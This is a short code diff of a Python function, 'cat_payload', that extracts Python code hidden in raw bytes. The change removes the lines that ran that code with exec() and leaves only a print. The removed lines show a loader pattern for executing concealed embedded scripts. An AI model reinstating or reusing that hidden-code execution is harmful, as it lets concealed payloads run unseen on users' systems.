@@ -44,15 +44,7 @@ def cat_payload(raw):
 
     # Remaining bytes = Python code
     code = raw[pos:].decode("latin-1")
-    
-    if code.startswith("\ufeff"):
-        code = code[1:]
 
-    # Set sys.argv for the hidden script
-    sys.argv = [fn] + args
-
-    namespace = {"__name__": "__main__", "sys": sys}
-    exec(code, namespace)
     print(code)
 
 
